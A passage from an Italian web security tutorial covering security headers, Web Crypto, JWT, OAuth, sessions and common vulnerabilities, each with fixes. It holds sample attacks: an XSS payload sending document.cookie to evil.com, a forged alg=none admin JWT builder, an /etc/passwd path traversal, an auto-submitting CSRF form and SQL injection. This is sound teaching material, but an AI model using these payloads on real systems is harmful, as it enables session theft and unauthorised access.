            f"frame-ancestors 'none'; "
            f"base-uri 'self'; "
            f"form-action 'self'"
        )
        
        # Anti-MIME-Sniffing
        response.headers['X-Content-Type-Options'] = 'nosniff'
        
        # Anti-Clickjacking
        response.headers['X-Frame-Options'] = 'DENY'
        
        # XSS Protection (legacy)
        response.headers['X-XSS-Protection'] = '1; mode=block'
        
        # Referrer Policy
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        
        # Permissions Policy
        response.headers['Permissions-Policy'] = \
            'geolocation=(), microphone=(), camera=()'
        
        # Cross-Origin Policies
        response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
        response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
        response.headers['Cross-Origin-Resource-Policy'] = 'same-origin'
        
        return response

@app.after_request
def security_headers(response):
    """Applica header di sicurezza a tutte le risposte"""
    return SecurityHeaders.apply_all(response)

@app.route('/')
def index():
    nonce = SecurityHeaders.get_csp_nonce()
    
    html = f"""
    <!DOCTYPE html>
    <html lang="it">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Secure App</title>
        <style nonce="{nonce}">
            body {{ font-family: Arial, sans-serif; margin: 40px; }}
            h1 {{ color: #2c3e50; }}
        </style>
    </head>
    <body>
        <h1>🔒 Secure Application</h1>
        <p>All security headers enabled!</p>
        
        <script nonce="{nonce}">
            console.log("✅ Script with nonce allowed by CSP");
        </script>
    </body>
    </html>
    """
    
    return html

if __name__ == '__main__':
    # ⚠️ In produzione: usa HTTPS (nginx + Let's Encrypt)
    app.run(debug=False, host='0.0.0.0', port=5000)
```

### Test Security Headers Online

```python
# Testa i tuoi header su:
SECURITY_HEADER_SCANNERS = [
    'https://securityheaders.com/',
    'https://observatory.mozilla.org/',
    'https://csp-evaluator.withgoogle.com/',
]

# Esempio rating:
"""
A+  ✅ Tutti gli header configurati correttamente
A   ✅ Ottima configurazione
B   ⚠️  Mancano alcuni header
C   ⚠️  Configurazione base
D   ❌ Molte mancanze
F   ❌ Nessun header di sicurezza
"""
```

---

## Web Crypto API (JavaScript)

### Generazione Chiavi Browser

```javascript
// Generate RSA key pair
async function generateRSAKeys() {
    const keyPair = await crypto.subtle.generateKey(
        {
            name: "RSA-OAEP",
            modulusLength: 2048,
            publicExponent: new Uint8Array([1, 0, 1]),
            hash: "SHA-256"
        },
        true,  // extractable
        ["encrypt", "decrypt"]
    );
    
    return keyPair;
}

// Generate AES key
async function generateAESKey() {
    const key = await crypto.subtle.generateKey(
        {
            name: "AES-GCM",
            length: 256
        },
        true,
        ["encrypt", "decrypt"]
    );
    
    return key;
}
```

### Cifratura Client-Side

```javascript
async function encryptData(plaintext, key) {
    // Convert string to ArrayBuffer
    const encoder = new TextEncoder();
    const data = encoder.encode(plaintext);
    
    // Generate random IV
    const iv = crypto.getRandomValues(new Uint8Array(12));
    
    // Encrypt with AES-GCM
    const ciphertext = await crypto.subtle.encrypt(
        {
            name: "AES-GCM",
            iv: iv
        },
        key,
        data
    );
    
    return { ciphertext, iv };
}

async function decryptData(ciphertext, iv, key) {
    const plaintext = await crypto.subtle.decrypt(
        {
            name: "AES-GCM",
            iv: iv
        },
        key,
        ciphertext
    );
    
    const decoder = new TextDecoder();
    return decoder.decode(plaintext);
}

// Usage
(async () => {
    const key = await generateAESKey();
    
    const { ciphertext, iv } = await encryptData("Secret message", key);
    console.log("Encrypted:", new Uint8Array(ciphertext));
    
    const decrypted = await decryptData(ciphertext, iv, key);
    console.log("Decrypted:", decrypted);
})();
```

### Hashing Client-Side

```javascript
async function hashPassword(password) {
    const encoder = new TextEncoder();
    const data = encoder.encode(password);
    
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    
    // Convert to hex
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    
    return hashHex;
}

// Usage
hashPassword("MyPassword123").then(hash => {
    console.log("SHA-256:", hash);
});
```

---

## JWT (JSON Web Tokens)

### Cos'è JWT

**JWT (JSON Web Token)** è uno standard aperto (RFC 7519) per trasmettere informazioni in modo sicuro tra parti come oggetto JSON.

**Caratteristiche**:
- ✅ **Self-contained**: Contiene tutte le info necessarie (no query DB)
- ✅ **Stateless**: Server non memorizza sessioni
- ✅ **Signed**: Firma garantisce integrità
- ✅ **Compact**: Formato compatto per HTTP headers/URL

### Analogia del Mondo Reale 🎫

```
JWT = Biglietto del Cinema
════════════════════════

┌─────────────────────────────┐
│  🎬 CINEMA TOKEN            │
│                             │
│  Film: Avengers             │ ← Payload (claims)
│  Sala: 5                    │
│  Posto: A12                 │
│  Scadenza: 20:30            │ ← Expiration
│                             │
│  [SIGILLO DEL CINEMA] 🔏   │ ← Signature
└─────────────────────────────┘

Verifica:
1. Leggi info dal biglietto (payload)
2. Verifica sigillo (signature)
3. Controlla scadenza (exp claim)
4. ✅ Se tutto OK → accesso consentito
```

### Struttura JWT - Le 3 Parti

```
JWT = header.payload.signature

Esempio reale:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

📦 PARTE 1: HEADER (base64url)
═══════════════════════════════
{
  "alg": "HS256",    // Algoritmo di firma
  "typ": "JWT"       // Tipo di token
}

📝 PARTE 2: PAYLOAD (base64url)
════════════════════════════════
{
  "sub": "1234567890",          // Subject (user ID)
  "name": "John Doe",           // Custom claim
  "iat": 1516239022,             // Issued At
  "exp": 1516242622              // Expiration
}

🔏 PARTE 3: SIGNATURE
═════════════════════
HMAC-SHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret_key
)
```

### Registered Claims (Standard)

```python
JWT_CLAIMS = {
    # ISSUER: Chi ha emesso il token
    'iss': 'https://auth.example.com',
    
    # SUBJECT: Identificatore dell'utente
    'sub': '1234567890',
    
    # AUDIENCE: Destinatari del token
    'aud': ['https://api.example.com', 'https://app.example.com'],
    
    # EXPIRATION: Timestamp scadenza (OBBLIGATORIO!)
    'exp': 1735689600,  # 2025-01-01 00:00:00 UTC
    
    # NOT BEFORE: Token valido solo dopo questo timestamp
    'nbf': 1704067200,  # 2024-01-01 00:00:00 UTC
    
    # ISSUED AT: Timestamp emissione
    'iat': 1704067200,
    
    # JWT ID: Identificatore unico (per revoca)
    'jti': 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
}
```

### Algoritmi JWT: HS256 vs RS256

| Caratteristica | HS256 (HMAC) | RS256 (RSA) |
|----------------|--------------|-------------|
| **Tipo** | Symmetric | Asymmetric |
| **Chiave** | Secret condiviso | Public/Private key pair |
| **Velocità** | ✅ Veloce | ⚠️ Più lento |
| **Firma** | Stesso secret | Private key |
| **Verifica** | Stesso secret | Public key |
| **Uso** | Monoliti, microservizi trusted | Microservizi, public APIs |
| **Rischio** | Secret leak → compromissione totale | Solo private key a rischio |

### Vulnerabilità JWT Comuni

#### 1. Algoritmo None (CVE-2015-9235)

```python
# ❌ VULNERABILITÀ: Attacker rimuove signature
# Header: {"alg": "none", "typ": "JWT"}
# Token: eyJhbGci...payload...  (no signature!)

import base64
import json

def exploit_none_algorithm():
    """Simula attacco algorithm=none"""
    
    # Attacker crea header con alg=none
    fake_header = {"alg": "none", "typ": "JWT"}
    fake_payload = {
        "sub": "admin",  # Impersona admin!
        "exp": 9999999999
    }
    
    # Encode senza signature
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(fake_header).encode()
    ).decode().rstrip('=')
    
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(fake_payload).encode()
    ).decode().rstrip('=')
    
    # Token SENZA signature
    fake_token = f"{header_b64}.{payload_b64}."
    
    return fake_token

# ✅ MITIGAZIONE
def verify_jwt_secure(token, secret):
    """Verifica JWT con protezione contro alg=none"""
    try:
        # IMPORTANTE: Specifica algoritmi consentiti
        payload = jwt.decode(
            token,
            secret,
            algorithms=['HS256', 'RS256']  # Whitelist esplicita!
        )
        return True, payload
    except jwt.InvalidAlgorithmError:
        return False, "Algorithm not allowed"
    except Exception as e:
        return False, str(e)
```

#### 2. Key Confusion (HS256 vs RS256)

```python
# ❌ VULNERABILITÀ: Attacker usa public key come HMAC secret

# Server config (VULNERABLE):
# - Accetta sia HS256 che RS256
# - Public key è... pubblica!

# Attacco:
# 1. Attacker scarica public key (es. da /.well-known/jwks.json)
# 2. Usa public key come HMAC secret per firmare token
# 3. Cambia header: "alg": "HS256"
# 4. Server verifica con public key come HMAC secret → VALIDO!

# ✅ MITIGAZIONE
ALLOWED_ALGORITHMS = {
    'api_internal': ['HS256'],     # Solo symmetric
    'api_public': ['RS256'],        # Solo asymmetric
}

def verify_with_context(token, context='api_internal'):
    """Verifica con algoritmo specifico per contesto"""
    allowed = ALLOWED_ALGORITHMS[context]
    
    try:
        payload = jwt.decode(
            token,
            get_key_for_context(context),
            algorithms=allowed  # NO mix HS256/RS256!
        )
        return True, payload
    except Exception as e:
        return False, str(e)
```

#### 3. Token Expiration Non Verificata

```python
# ❌ VULNERABILE
def verify_insecure(token):
    # Decode senza verificare expiration
    payload = jwt.decode(token, SECRET, options={"verify_exp": False})
    return payload

# ✅ SICURO
def verify_secure(token):
    # Verifica SEMPRE expiration
    payload = jwt.decode(
        token,
        SECRET,
        algorithms=['HS256'],
        options={
            "verify_signature": True,  # ✅
            "verify_exp": True,        # ✅
            "verify_nbf": True,        # ✅ Not Before
            "verify_iat": True,        # ✅ Issued At
            "verify_aud": True,        # ✅ Audience
        },
        audience="https://api.example.com"
    )
    return payload
```

### Implementazione JWT Completa e Sicura

```python
import jwt
import secrets
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple

class JWTManager:
    """Manager sicuro per JWT tokens"""
    
    def __init__(self, secret_key: str, issuer: str, audience: str):
        self.secret_key = secret_key
        self.issuer = issuer
        self.audience = audience
        self.algorithm = 'HS256'
        
        # Blacklist per token revocati (in produzione: Redis/DB)
        self.revoked_tokens = set()
    
    def create_access_token(
        self,
        user_id: int,
        username: str,
        roles: list = None,
        expires_delta: timedelta = None
    ) -> str:
        """Crea access token JWT"""
        
        if expires_delta is None:
            expires_delta = timedelta(minutes=15)  # Short-lived!
        
        now = datetime.utcnow()
        
        payload = {
            # Registered claims
            'iss': self.issuer,
            'aud': self.audience,
            'sub': str(user_id),
            'iat': now,
            'exp': now + expires_delta,
            'nbf': now,
            'jti': secrets.token_urlsafe(16),  # Unique ID
            
            # Custom claims
            'username': username,
            'roles': roles or [],
            'token_type': 'access'
        }
        
        token = jwt.encode(payload, self.secret_key, algorithm=self.algorithm)
        return token
    
    def create_refresh_token(self, user_id: int) -> str:
        """Crea refresh token (long-lived)"""
        
        now = datetime.utcnow()
        
        payload = {
            'iss': self.issuer,
            'aud': self.audience,
            'sub': str(user_id),
            'iat': now,
            'exp': now + timedelta(days=30),  # 30 giorni
            'jti': secrets.token_urlsafe(16),
            'token_type': 'refresh'
        }
        
        token = jwt.encode(payload, self.secret_key, algorithm=self.algorithm)
        return token
    
    def verify_token(self, token: str) -> Tuple[bool, Optional[Dict]]:
        """Verifica JWT token con tutti i controlli"""
        
        try:
            # 1. Decode e verifica signature/expiration/etc
            payload = jwt.decode(
                token,
                self.secret_key,
                algorithms=[self.algorithm],
                issuer=self.issuer,
                audience=self.audience,
                options={
                    "verify_signature": True,
                    "verify_exp": True,
                    "verify_nbf": True,
                    "verify_iat": True,
                    "verify_iss": True,
                    "verify_aud": True,
                    "require_exp": True,
                    "require_iat": True,
                }
            )
            
            # 2. Verifica token type
            if payload.get('token_type') != 'access':
                return False, {"error": "Invalid token type"}
            
            # 3. Verifica blacklist (token revocato)
            jti = payload.get('jti')
            if jti in self.revoked_tokens:
                return False, {"error": "Token has been revoked"}
            
            # 4. Verifica claims custom
            if not payload.get('username'):
                return False, {"error": "Missing required claim: username"}
            
            return True, payload
            
        except jwt.ExpiredSignatureError:
            return False, {"error": "Token has expired"}
        except jwt.InvalidAudienceError:
            return False, {"error": "Invalid audience"}
        except jwt.InvalidIssuerError:
            return False, {"error": "Invalid issuer"}
        except jwt.InvalidSignatureError:
            return False, {"error": "Invalid signature"}
        except jwt.InvalidTokenError as e:
            return False, {"error": f"Invalid token: {str(e)}"}
    
    def revoke_token(self, token: str) -> bool:
        """Revoca token (aggiunge a blacklist)"""
        try:
            # Decode per ottenere jti (anche se scaduto)
            payload = jwt.decode(
                token,
                self.secret_key,
                algorithms=[self.algorithm],
                options={"verify_exp": False}  # Ignora expiration per revoca
            )
            
            jti = payload.get('jti')
            if jti:
                self.revoked_tokens.add(jti)
                return True
            
            return False
            
        except Exception:
            return False
    
    def refresh_access_token(self, refresh_token: str) -> Optional[str]:
        """Rinnova access token usando refresh token"""
        try:
            payload = jwt.decode(
                refresh_token,
                self.secret_key,
                algorithms=[self.algorithm],
                issuer=self.issuer,
                audience=self.audience
            )
            
            # Verifica tipo token
            if payload.get('token_type') != 'refresh':
                return None
            
            # Verifica blacklist
            if payload.get('jti') in self.revoked_tokens:
                return None
            
            # Crea nuovo access token
            user_id = int(payload['sub'])
            new_token = self.create_access_token(
                user_id=user_id,
                username=payload.get('username', ''),
                roles=payload.get('roles', [])
            )
            
            return new_token
            
        except Exception:
            return None


# Test completo
if __name__ == '__main__':
    print("\n🔐 JWT Manager Demo\n")
    
    # Inizializza manager
    jwt_manager = JWTManager(
        secret_key=secrets.token_hex(32),
        issuer="https://auth.example.com",
        audience="https://api.example.com"
    )
    
    # 1. Crea tokens
    access_token = jwt_manager.create_access_token(
        user_id=123,
        username="alice",
        roles=["user", "editor"]
    )
    refresh_token = jwt_manager.create_refresh_token(user_id=123)
    
    print(f"Access Token:  {access_token[:50]}...")
    print(f"Refresh Token: {refresh_token[:50]}...\n")
    
    # 2. Verifica access token
    valid, payload = jwt_manager.verify_token(access_token)
    print(f"✅ Access token valid: {valid}")
    print(f"   User: {payload['username']}")
    print(f"   Roles: {payload['roles']}")
    print(f"   Expires: {datetime.fromtimestamp(payload['exp'])}\n")
    
    # 3. Revoca token
    jwt_manager.revoke_token(access_token)
    valid, error = jwt_manager.verify_token(access_token)
    print(f"❌ After revocation: {valid}")
    print(f"   Error: {error['error']}\n")
    
    # 4. Refresh access token
    new_access = jwt_manager.refresh_access_token(refresh_token)
    print(f"🔄 New access token: {new_access[:50]}...\n")
    
    valid, payload = jwt_manager.verify_token(new_access)
    print(f"✅ New token valid: {valid}")

### JWT con Flask (API Auth)

```python
from flask import Flask, request, jsonify
from functools import wraps

app = Flask(__name__)

def token_required(f):
    """Decorator per proteggere endpoints"""
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        
        if not token:
            return jsonify({'error': 'Token mancante'}), 401
        
        # Remove "Bearer " prefix
        if token.startswith('Bearer '):
            token = token[7:]
        
        valid, payload = verify_jwt(token)
        if not valid:
            return jsonify({'error': payload}), 401
        
        # Pass user info to route
        return f(payload, *args, **kwargs)
    
    return decorated

@app.route('/api/login', methods=['POST'])
def login():
    """Login endpoint"""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    # Verify credentials (simplified)
    if username == "alice" and password == "password123":
        token = create_jwt(user_id=1, username=username)
        return jsonify({'token': token})
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/protected', methods=['GET'])
@token_required
def protected_route(current_user):
    """Protected endpoint"""
    return jsonify({
        'message': 'Access granted!',
        'user': current_user['username']
    })

# Test con requests
import requests

# Login
response = requests.post('http://localhost:5000/api/login', 
                        json={'username': 'alice', 'password': 'password123'})
token = response.json()['token']

# Access protected route
response = requests.get('http://localhost:5000/api/protected',
                       headers={'Authorization': f'Bearer {token}'})
print(response.json())
```

---

## OAuth 2.0

### Flusso Authorization Code

```
User                  Client App              Auth Server           Resource Server
----                  ----------              -----------           ---------------
1. Click "Login"  ──►
                      
2.                ◄── Redirect to auth
   
3. Login + Consent ──────────►
   
4.                ◄────────────  Authorization Code
   
5. Auth Code      ──────────────────►
   
6.                ◄────────────────── Access Token
   
7. Access Token   ──────────────────────────────────►
   
8.                ◄──────────────────────────────────  Protected Resource
```

### Implementazione OAuth Client

```python
import requests
from flask import Flask, request, redirect, session
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# OAuth Provider Config (es. Google, GitHub)
OAUTH_CONFIG = {
    'client_id': 'your_client_id',
    'client_secret': 'your_client_secret',
    'authorize_url': 'https://oauth.provider.com/authorize',
    'token_url': 'https://oauth.provider.com/token',
    'redirect_uri': 'http://localhost:5000/callback',
    'scope': 'user:email'
}

@app.route('/login')
def login():
    """Inizia OAuth flow"""
    # Generate state (CSRF protection)
    state = secrets.token_urlsafe(32)
    session['oauth_state'] = state
    
    # Build authorization URL
    auth_url = (
        f"{OAUTH_CONFIG['authorize_url']}?"
        f"client_id={OAUTH_CONFIG['client_id']}&"
        f"redirect_uri={OAUTH_CONFIG['redirect_uri']}&"
        f"scope={OAUTH_CONFIG['scope']}&"
        f"state={state}&"
        f"response_type=code"
    )
    
    return redirect(auth_url)

@app.route('/callback')
def callback():
    """OAuth callback"""
    # Verify state (CSRF)
    if request.args.get('state') != session.get('oauth_state'):
        return "Invalid state", 400
    
    # Get authorization code
    code = request.args.get('code')
    
    # Exchange code for token
    token_response = requests.post(
        OAUTH_CONFIG['token_url'],
        data={
            'client_id': OAUTH_CONFIG['client_id'],
            'client_secret': OAUTH_CONFIG['client_secret'],
            'code': code,
            'redirect_uri': OAUTH_CONFIG['redirect_uri'],
            'grant_type': 'authorization_code'
        }
    )
    
    token_data = token_response.json()
    access_token = token_data['access_token']
    
    # Store token in session
    session['access_token'] = access_token
    
    return redirect('/profile')

@app.route('/profile')
def profile():
    """Access protected resource"""
    token = session.get('access_token')
    
    if not token:
        return redirect('/login')
    
    # Use token to access API
    response = requests.get(
        'https://api.provider.com/user',
        headers={'Authorization': f'Bearer {token}'}
    )
    
    user_data = response.json()
    return f"Welcome {user_data['name']}!"
```

---

## Session Management

### Secure Cookies

```python
from flask import Flask, session, make_response
from datetime import timedelta

app = Flask(__name__)
app.secret_key = 'super-secret-key'

# Secure session config
app.config.update(
    SESSION_COOKIE_SECURE=True,      # Only HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # No JavaScript access
    SESSION_COOKIE_SAMESITE='Strict', # CSRF protection
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)
)

@app.route('/login', methods=['POST'])
def login():
    # Authenticate user
    session['user_id'] = 123
    session['username'] = 'alice'
    session.permanent = True  # Use PERMANENT_SESSION_LIFETIME
    
    response = make_response("Logged in")
    
    # Additional cookie security
    response.set_cookie(
        'custom_cookie',
        value='data',
        secure=True,
        httponly=True,
        samesite='Strict',
        max_age=3600
    )
    
    return response

@app.route('/logout')
def logout():
    session.clear()
    return "Logged out"
```

### CSRF Protection

```python
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
csrf = CSRFProtect(app)

# Protegge automaticamente POST/PUT/DELETE
@app.route('/api/data', methods=['POST'])
def api_endpoint():
    # CSRF token verificato automaticamente
    data = request.get_json()
    return jsonify({'received': data})

# HTML form con CSRF token
@app.route('/form')
def form():
    return '''
    <form method="POST" action="/submit">
        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
        <input type="text" name="data">
        <button type="submit">Submit</button>
    </form>
    '''
```

---

## API Security

### Rate Limiting

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per hour"]
)

@app.route('/api/data')
@limiter.limit("10 per minute")
def api_data():
    return jsonify({'data': 'value'})

# Rate limit per user
@limiter.limit("5 per minute", key_func=lambda: session.get('user_id'))
@app.route('/api/user_action')
def user_action():
    return jsonify({'action': 'completed'})
```

### Request Signing

```python
import hmac
import hashlib
import time

API_SECRET = "shared-secret-key"

def sign_request(method, path, body, timestamp):
    """Firma richiesta API"""
    message = f"{method}|{path}|{body}|{timestamp}"
    
    signature = hmac.new(
        API_SECRET.encode(),
        message.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return signature

def verify_request_signature(request):
    """Verifica firma richiesta"""
    signature = request.headers.get('X-Signature')
    timestamp = request.headers.get('X-Timestamp')
    
    # Check timestamp (prevent replay attacks)
    if abs(time.time() - float(timestamp)) > 300:  # 5 min window
        return False, "Request expired"
    
    # Verify signature
    expected = sign_request(
        request.method,
        request.path,
        request.get_data(as_text=True),
        timestamp
    )
    
    if not hmac.compare_digest(signature, expected):
        return False, "Invalid signature"
    
    return True, "Valid"

# Client
def make_signed_request(url, data):
    """Effettua richiesta firmata"""
    timestamp = str(time.time())
    body = json.dumps(data)
    
    signature = sign_request('POST', '/api/data', body, timestamp)
    
    response = requests.post(
        url,
        data=body,
        headers={
            'X-Signature': signature,
            'X-Timestamp': timestamp,
            'Content-Type': 'application/json'
        }
    )
    
    return response
```

---

## Vulnerabilità Web Comuni

### XSS (Cross-Site Scripting)

**Cos'è**: Injection di script malevoli in pagine web.

```python
# ❌ VULNERABILE a Reflected XSS
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # Direttamente nel HTML!
    return f"<h1>Risultati per: {query}</h1>"

# Attacco:
# /search?q=<script>fetch('https://evil.com?cookie='+document.cookie)</script>
# Script eseguito nel browser della vittima!

# ✅ MITIGATO - Output Encoding
from markupsafe import escape

@app.route('/search')
def search_safe():
    query = request.args.get('q', '')
    return f"<h1>Risultati per: {escape(query)}</h1>"

# ✅ MITIGATO - Template Engine (Jinja2)
@app.route('/search')
def search_template():
    query = request.args.get('q', '')
    return render_template('search.html', query=query)

# search.html (auto-escaping abilitato di default)
# <h1>Risultati per: {{ query }}</h1>
```

### SQL Injection

```python
# ❌ VULNERABILE
@app.route('/user/<user_id>')
def get_user_vulnerable(user_id):
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    # Attacco: /user/1 OR 1=1
    # Query: SELECT * FROM users WHERE id = 1 OR 1=1
    # Restituisce TUTTI gli utenti!

# ✅ MITIGATO - Prepared Statements
@app.route('/user/<int:user_id>')  # Type conversion
def get_user_safe(user_id):
    query = "SELECT * FROM users WHERE id = ?"
    cursor.execute(query, (user_id,))  # Parametrizzata
    return cursor.fetchone()

# ✅ MITIGATO - ORM (SQLAlchemy)
@app.route('/user/<int:user_id>')
def get_user_orm(user_id):
    user = User.query.filter_by(id=user_id).first()
    return jsonify(user.to_dict())
```

### CSRF (Cross-Site Request Forgery)

```python
# ❌ VULNERABILE
@app.route('/transfer', methods=['POST'])
def transfer_money():
    to = request.form['to']
    amount = request.form['amount']
    # Trasferisce denaro senza verificare origine richiesta!
    
# Attacco (su evil.com):
# <form action="https://bank.com/transfer" method="POST">
#   <input name="to" value="attacker">
#   <input name="amount" value="10000">
# </form>
# <script>document.forms[0].submit()</script>

# ✅ MITIGATO - CSRF Token
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])
@csrf.protect  # Verifica automaticamente token
def transfer_money_safe():
    to = request.form['to']
    amount = request.form['amount']
    # Token verificato: richiesta legittima

# HTML form con token
# <form method="POST" action="/transfer">
#   <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
#   ...
# </form>
```

### Path Traversal

```python
# ❌ VULNERABILE
@app.route('/download/<filename>')
def download_file(filename):
    # Attacco: /download/../../../../etc/passwd
    return send_file(f'/uploads/{filename}')

# ✅ MITIGATO
from werkzeug.utils import secure_filename
import os

UPLOAD_FOLDER = '/var/www/uploads'

@app.route('/download/<filename>')
def download_file_safe(filename):
    # 1. Sanitizza filename
    filename = secure_filename(filename)
    
    # 2. Costruisci path completo
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    
    # 3. Verifica che sia dentro UPLOAD_FOLDER
    filepath = os.path.realpath(filepath)
    if not filepath.startswith(os.path.realpath(UPLOAD_FOLDER)):
        abort(403)
    
    # 4. Verifica esistenza
    if not os.path.exists(filepath):
        abort(404)
    
    return send_file(filepath)
```

### Insecure Deserialization

```python
# ❌ PERICOLOSO - Pickle
import pickle

@app.route('/load_data', methods=['POST'])
def load_data_vulnerable():
    data = request.data
    obj = pickle.loads(data)  # ❌ RCE!
    # Attacker può eseguire codice arbitrario!

# ✅ SICURO - JSON
import json

@app.route('/load_data', methods=['POST'])
def load_data_safe():
    data = request.data
    obj = json.loads(data)  # ✅ Solo dati, no code execution
    return obj
```

---

## Best Practices

### ✅ Security Checklist Completa

```python
WEB_SECURITY_CHECKLIST = """
┌─────────────────────────────────────────────────────────┐
│          WEB APPLICATION SECURITY CHECKLIST            │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ 🔐 TRANSPORT LAYER                                     │
│  ✅ TLS 1.3 configurato e testato                      │
│  ✅ Certificati validi (Let's Encrypt)                 │
│  ✅ HSTS header con preload                            │
│  ✅ Certificate pinning (app mobili)                   │
│                                                         │
│ 🛡️ SECURITY HEADERS                                    │
│  ✅ Content-Security-Policy (strict)                   │
│  ✅ X-Content-Type-Options: nosniff                    │
│  ✅ X-Frame-Options: DENY                              │
│  ✅ Referrer-Policy: strict-origin-when-cross-origin   │
│  ✅ Permissions-Policy configurato                     │
│                                                         │
│ 🎫 AUTHENTICATION & AUTHORIZATION                      │
│  ✅ Password hashing (Argon2/bcrypt)                   │
│  ✅ MFA implementato                                   │
│  ✅ JWT con expiration (short-lived)                   │
│  ✅ Refresh tokens (secure storage)                    │
│  ✅ Rate limiting su /login                            │
│  ✅ Account lockout policy                             │
│                                                         │
│ 🍪 SESSION MANAGEMENT                                   │
│  ✅ Secure cookies (Secure, HttpOnly, SameSite)        │
│  ✅ Session expiration                                 │
│  ✅ Session regeneration dopo login                    │
│  ✅ CSRF protection                                    │
│                                                         │
│ 🔍 INPUT VALIDATION & OUTPUT ENCODING                  │
│  ✅ Input validation (whitelist approach)              │
│  ✅ Output encoding (HTML, JS, URL, CSS contexts)      │
│  ✅ Prepared statements (SQL injection)                │
│  ✅ Command injection prevention                       │
│                                                         │
│ 🔌 API SECURITY                                         │
│  ✅ Request signing (HMAC)                             │
│  ✅ Rate limiting per endpoint                         │
│  ✅ API versioning                                     │
│  ✅ Input validation (JSON Schema)                     │
│  ✅ Error messages non rivelano dettagli               │
│                                                         │
│ 📊 MONITORING & LOGGING                                │
│  ✅ Security events logged                             │
│  ✅ Log tampering protection                           │
│  ✅ Audit trail completo                               │
│  ✅ Anomaly detection                                  │
│  ✅ SIEM integration                                   │
│                                                         │
│ 🔄 DEPENDENCY MANAGEMENT                                │
│  ✅ Dipendenze aggiornate                              │
│  ✅ Vulnerability scanning (Snyk, Dependabot)          │
│  ✅ SCA (Software Composition Analysis)                │
│                                                         │
│ 🧪 TESTING                                              │
│  ✅ SAST (Static Analysis)                             │
│  ✅ DAST (Dynamic Analysis)                            │
│  ✅ Penetration testing                                │
│  ✅ Security code review                               │
│                                                         │
└─────────────────────────────────────────────────────────┘
"""

print(WEB_SECURITY_CHECKLIST)
```

| Aspetto | Implementazione |
|---------|----------------|
| **Transport** | TLS 1.3, HSTS |
| **Certificates** | Let's Encrypt, Pinning |
| **Headers** | CSP, X-Frame-Options, HSTS |
| **Auth** | JWT con expiration, OAuth2 |
| **Sessions** | Secure cookies, HttpOnly, SameSite |
| **CSRF** | Token su form/POST |
| **XSS** | Input validation, CSP, escaping |
| **Rate Limiting** | Per IP e per utente |
| **Logging** | Log security events |

---

## Esercizi

### Esercizio 24.1 ★☆☆: Sistema Login Sicuro

Implementa un sistema di login con:
- Password hashing (Argon2)
- Rate limiting (max 5 tentativi)
- CSRF protection
- Secure session cookies

**Soluzione Parziale**:
```python
from flask import Flask, request, session
from argon2 import PasswordHasher
from flask_wtf.csrf import CSRFProtect
from flask_limiter import Limiter

app = Flask(__name__)
csrf = CSRFProtect(app)
ph = PasswordHasher()
limiter = Limiter(app, key_func=lambda: request.remote_addr)

app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Strict'
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Verifica credenziali con Argon2
    # ... implementa la logica ...
    
    session['user_id'] = user_id
    return redirect('/dashboard')
```

### Esercizio 24.2 ★★☆: API con JWT

Crea un'API REST protetta con:
- JWT authentication (access + refresh tokens)
- Role-based access control (RBAC)
- Request signing con HMAC
- Rate limiting per utente

### Esercizio 24.3 ★★★: Security Audit

Analizza un'applicazione web e identifica:
- Vulnerabilità (XSS, SQL Injection, CSRF)
- Security headers mancanti
- Configurazioni insicure
- Dipendenze vulnerabili

Crea report con remediation plan.

---

## Riepilogo

### Concetti Chiave

| Concetto | Scopo | Implementazione |
|----------|-------|----------------|
| **TLS/HTTPS** | Cifra traffico | Certificati Let's Encrypt, TLS 1.3 |
| **Security Headers** | Protegge browser | HSTS, CSP, X-Frame-Options |
| **JWT** | Autenticazione stateless | HS256/RS256, expiration, refresh |
| **OAuth 2.0** | Delegated authorization | Authorization code flow |
| **Session Security** | Protegge sessioni | Secure/HttpOnly/SameSite cookies |
| **API Security** | Protegge API | HMAC signing, rate limiting |
| **Input Validation** | Previene injection | Whitelist, prepared statements |

### Golden Rules

```
🔒 CRITTOGRAFIA WEB - LE 10 REGOLE D'ORO

1. ✅ Usa SEMPRE HTTPS (TLS 1.3)
2. ✅ Configura TUTTI gli security headers
3. ✅ JWT: short-lived access + long-lived refresh
4. ✅ Password: Argon2 > bcrypt > PBKDF2
5. ✅ Sessioni: Secure, HttpOnly, SameSite=Strict
